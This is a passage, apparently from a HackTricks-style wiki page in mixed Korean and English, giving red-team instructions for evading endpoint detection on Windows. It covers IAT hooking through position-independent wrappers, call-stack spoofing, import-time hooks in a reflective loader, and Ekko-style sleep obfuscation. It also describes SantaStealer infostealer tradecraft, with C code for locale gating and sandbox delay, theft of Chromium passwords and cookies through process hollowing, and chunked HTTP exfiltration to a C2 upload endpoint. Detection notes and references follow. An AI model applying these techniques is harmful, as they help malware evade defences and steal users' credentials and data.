> 참고: 이 기술은 자체적으로 privilege escalation을 제공하지 않으며, admin rights가 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red 팀은 runtime evasion을 C2 implant 밖으로 옮겨 대상 모듈 자체 내에서 수행할 수 있습니다. 대상 모듈의 Import Address Table (IAT)을 후킹하고, 선택된 API들을 attacker‑controlled, position‑independent code (PIC)를 통해 라우팅합니다. 이 방법은 많은 키트가 노출하는 작은 API 표면(예: CreateProcessA)을 넘어 evasion을 일반화하고, 동일한 보호를 BOFs 및 post‑exploitation DLLs에도 확장합니다.

High-level approach
- 타깃 모듈 옆에 reflective loader(선행(prepended) 또는 companion)를 사용해 PIC blob을 스테이징합니다. PIC는 self‑contained하고 position‑independent여야 합니다.
- 호스트 DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하며 대상 import의 IAT 항목(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)을 얇은 PIC wrapper를 가리키도록 패치합니다.
- 각 PIC wrapper는 실제 API 주소로 tail‑call하기 전에 evasion을 실행합니다. 일반적인 evasion에는 다음이 포함됩니다:
  - 호출 전후에 메모리 마스크/언마스크 수행(예: encrypt beacon regions, RWX→RX, 페이지 이름/권한 변경) 후 호출 후 복원.
  - Call‑stack spoofing: 정상적인 스택을 구성하고 대상 API로 전환하여 call‑stack 분석이 예상되는 프레임으로 해석되도록 합니다.
  - 호환성을 위해 인터페이스를 export하여 Aggressor script(또는 동등한 도구)가 Beacon, BOFs 및 post‑ex DLLs에서 후킹할 API를 등록할 수 있도록 합니다.

Why IAT hooking here
- 후킹된 import를 사용하는 모든 코드에 대해 동작하므로 도구 코드를 수정하거나 Beacon이 특정 API를 프록시하도록 의존할 필요가 없습니다.
- post‑ex DLLs를 커버합니다: LoadLibrary*를 후킹하면 모듈 로드(예: System.Management.Automation.dll, clr.dll)를 가로채고 동일한 마스킹/스택 evasion을 해당 API 호출에 적용할 수 있습니다.
- CreateProcessA/W를 래핑하면 call‑stack–based 탐지에 대해 process‑spawning post‑ex 명령의 신뢰성을 회복할 수 있습니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- 패치는 relocations/ASLR 이후, import의 첫 사용 이전에 적용하세요. TitanLdr/AceLdr 같은 reflective loaders는 로드된 모듈의 DllMain 동안 훅을 시연합니다.
- 래퍼는 작고 PIC-safe하게 유지하세요; 실제 API는 패치 전에 캡처한 원본 IAT 값이나 LdrGetProcedureAddress를 통해 해결합니다.
- PIC에는 RW → RX 전환을 사용하고 writable+executable 페이지를 남기지 마세요.

Call‑stack spoofing stub
- Draugr‑style PIC stubs는 가짜 콜 체인(정상 모듈로의 return 주소)을 구성한 다음 실제 API로 피벗합니다.
- 이는 Beacon/BOFs에서 민감한 API로 향하는 정형화된 스택을 기대하는 탐지를 무력화합니다.
- API prologue 전에 기대되는 프레임 내부에 도달하도록 stack cutting/stack stitching 기법과 페어링하세요.

Operational integration
- reflective loader를 post‑ex DLL들 앞에 붙여서 DLL이 로드될 때 PIC와 훅이 자동으로 초기화되게 하세요.
- Aggressor 스크립트를 사용해 대상 API를 등록하면 Beacon 및 BOFs가 코드 변경 없이 동일한 회피 경로의 이점을 투명하게 누릴 수 있습니다.

Detection/DFIR considerations
- IAT 무결성: non‑image (heap/anon) 주소로 해석되는 엔트리; import 포인터의 주기적 검증.
- 스택 이상: 로드된 이미지에 속하지 않는 return 주소들; non‑image PIC로의 급작스런 전환; 일관되지 않은 RtlUserThreadStart 혈통.
- 로더 텔레메트리: 프로세스 내 IAT 쓰기, import thunk를 수정하는 조기 DllMain 활동, 로드 시 생성된 예기치 않은 RX 영역.
- Image‑load evasion: LoadLibrary* 훅이 있는 경우, 메모리 마스킹 이벤트와 상관된 automation/clr 어셈블리의 의심스러운 로드를 모니터링하세요.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A는 프로세스 목록을 순회하고 각 이름을 커스텀 롤링 체크섬으로 해시한 후 디버거/샌드박스용 임베디드 블랙리스트와 비교합니다; 또한 컴퓨터 이름에 대해 체크섬을 반복하고 `C:\analysis` 같은 작업 디렉토리를 확인합니다.
- Variant B는 시스템 속성(프로세스 수 하한, 최근 가동 시간)을 검사하고 `OpenServiceA("VBoxGuest")`를 호출해 VirtualBox 추가 항목을 감지하며, sleep 주위의 타이밍 검사를 수행해 싱글스텝을 탐지합니다. 어느 하나라도 탐지되면 모듈이 실행되기 전에 중단합니다.

### Fileless helper + double ChaCha20 reflective loading

- 주 DLL/EXE는 Chromium credential helper를 포함하며, 이는 디스크에 드롭되거나 수동으로 인메모리에 매핑됩니다; fileless 모드에서는 import/relocation을 자체 해결해 helper 아티팩트가 디스크에 남지 않도록 합니다.
- 해당 helper는 ChaCha20으로 두 번 암호화된 second-stage DLL을 저장합니다(두 개의 32바이트 키 + 12바이트 nonce). 두 번의 패스를 거친 후, blob을 reflectively 로드하고(즉 `LoadLibrary` 사용 안 함) [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)에서 파생된 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports를 호출합니다.
- ChromElevator 루틴은 direct-syscall reflective process hollowing을 사용해 실행 중인 Chromium 브라우저에 인젝션하고, AppBound Encryption 키를 상속받아 ABE hardening에도 불구하고 SQLite 데이터베이스에서 비밀번호/쿠키/신용카드를 직접 복호화합니다.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`는 전역 `memory_generators` 함수 포인터 테이블을 반복하며 각 활성 모듈(Telegram, Discord, Steam, 스크린샷, 문서, 브라우저 확장 등)마다 스레드를 생성합니다. 각 스레드는 결과를 공유 버퍼에 쓰고 약 `~45s`의 조인 윈도우 후 파일 수를 보고합니다.
- 완료되면 모든 내용을 정적 링크된 `miniz` 라이브러리로 `%TEMP%\\Log.zip`으로 압축합니다. `ThreadPayload1`은 15s 동안 sleep한 뒤 아카이브를 10 MB 청크로 나눠 HTTP POST로 `http://<C2>:6767/upload`에 스트리밍하며, 브라우저 `multipart/form-data` 경계(`----WebKitFormBoundary***`)를 스푸핑합니다. 각 청크에는 `User-Agent: upload`, `auth: <build_id>`, 선택적 `w: <campaign_tag>`를 포함하고, 마지막 청크에는 `complete: true`를 추가해 C2가 재조립이 완료되었음을 알 수 있게 합니다.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
